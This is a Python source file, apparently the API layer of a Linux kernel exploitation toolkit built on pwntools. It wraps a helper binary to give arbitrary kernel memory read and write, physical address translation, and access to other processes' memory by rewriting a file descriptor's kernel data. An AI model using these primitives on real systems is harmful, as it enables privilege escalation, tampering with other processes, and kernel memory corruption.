from os import stat
from . import internal
from pwnlib.tubes.process import process
from typing import Set, Tuple

PdtData = Tuple[int, int]


def _pdt_data_decorator(func):
    def inner(self, *args, **kwargs):
        self._setup_map_for_self()
        return func(self, *args, **kwargs)
    return inner


class API(process):
    def __init__(self):
        super().__init__(['/tmp/AaBbCcDdEeFfGgH', 'interactive'])
        self.recvuntil(b'$$$')
        # controller process pids ptr to reset their fd to cleanup
        self.proc_mem_cleanup_list: Set[Tuple[int, int]] = set()
        self.task_struct_ptr = internal.get_curr(self)
        # Where the PDT is re-mapped in userspace, no need to clean up.
        self.pdt_data: PdtData = None

    def _cleanup_fd(self):
        for pid, fd in self.proc_mem_cleanup_list:
            task_ptr = internal.pid_to_task_struct_ptr(self, pid)
            internal.set_fd_private_data(self, task_ptr, task_ptr, fd)
        self.proc_mem_cleanup_list.clear()

    def _setup_map_for_self(self):
        if self.pdt_data != None:
            return
        strct = internal.get_task_struct(self)
        self.pdt_data = internal.map_to_vm(self, strct, 0)

    @_pdt_data_decorator
    def _virt_to_phys_user(self, pid: int, addr: int):
        return internal.any_virt_to_phys_user(
            self,
            internal.get_task_struct(
                self, internal.pid_to_task_struct_ptr(self, pid)),
            addr,
            self.pdt_data
        )

    def _virt_to_phys_driver(self, pid: int, addr: int):
        return internal.any_virt_to_phys(
            self,
            internal.get_task_struct(
                self, internal.pid_to_task_struct_ptr(self, pid)),
            addr
        )

    @_pdt_data_decorator
    def _write_to_kernel_user(self, addr: int, data: bytes):
        with internal.user_map(self, self.pdt_data, addr) as uaddr:
            return internal.write_many_user(self, uaddr, len(data), data)

    def _write_to_kernel_driver(self, addr: int, data: bytes):
        return internal.write_many(self, addr, len(data), data)

    @_pdt_data_decorator
    def _read_from_kernel_user(self, addr: int, length: int):
        with internal.user_map(self, self.pdt_data, addr) as uaddr:
            return internal.read_many_user(self, uaddr, length)

    def _read_from_kernel_driver(self, addr: int, length: int):
        return internal.read_many(self, addr, length)

    def access_other_process_va(self, from_pid: int, to_pid: int, fd: int = 3):
        """Access another process's virtual address space like /proc/pid/mem

        To view `to_pid`'s VA space, in `from_pid` open `/proc/self/mem`. The
        file descriptor you'll get from the open syscall is the `fd` argument
        to this function. After calling this function you'll be able to access
        `to_pid`'s memory as if you ran `int fd = open("/proc/to_pid/mem", mode)`.

        If using the C interactive utility, /proc/self/mem is open at fd=3 on
        launch and is accessible to reading and writing via. the `wf` and `rf`
        commands respectively.

        NOTE: Before closing `from_pid` you *MUST* call `perform_cleanup` or close
        this process, otherwise kernel memory *WILL* get corrupted.

        Args:
            from_pid (int): The PID of the process that will be granted access
            to_pid (int): the PID of the process to access to access
            fd (int, optional): The FD of the open file, read above. Defaults to 3.
        """
        from_ptr = internal.pid_to_task_struct_ptr(self, from_pid)
        to_ptr = internal.pid_to_task_struct_ptr(self, to_pid)
        internal.set_fd_private_data(self, from_ptr, to_ptr, fd)
        self.proc_mem_cleanup_list.add((from_pid, fd))

    def virt_to_phys(self, pid: int, addr: int, user_only: bool = False) -> int:
        """Get the physical address of a virtual address from a given process.

        Args:
            pid (int): The PID of the process this address is from
            addr (int): The address to covert
            user_only (bool, optional): If true, don't use the driver. Defaults to False.

        Returns:
            int: The physical address of the page the address is mapped to
        """
        if addr >= internal.PAGE_OFFSET:
            return internal.virt_to_phys(addr)
        elif(user_only):
            return self._virt_to_phys_user(pid, addr)
        else:
            return self._virt_to_phys_driver(pid, addr)

    def write_to_kernel(self, addr: int, data: bytes, user_only: bool = False):
        """Write data to kernel memory

        When in user mode, does not check page boundaries.

        Args:
            addr (int): Address in kernel space
            data (bytes): Data to write
            user_only (bool, optional): Don't use the driver. Defaults to False.
        """
        if(user_only):
            return self._write_to_kernel_user(addr, data)
        else:
            return self._write_to_kernel_driver(addr, data)

    def read_from_kernel(self, addr: int, length: bytes, user_only: bool = False) -> bytes:
        """Read data from kernel space

        In user mode, page boundaries are not checked

        Args:
            addr (int): Address in kernel space to read from
            length (bytes): Length of data to read
            user_only (bool, optional): Don't use the driver. Defaults to False.

        Returns:
            bytes: The data read
        """
        if(user_only):
            return self._read_from_kernel_user(addr, length)
        else:
            return self._read_from_kernel_driver(addr, length)

    def perform_cleanup(self):
        """Perform necessary cleanup on target process
        Called automatically on close
        """
        self._cleanup_fd()

    def close(self):
        self.perform_cleanup()
        return super().close()
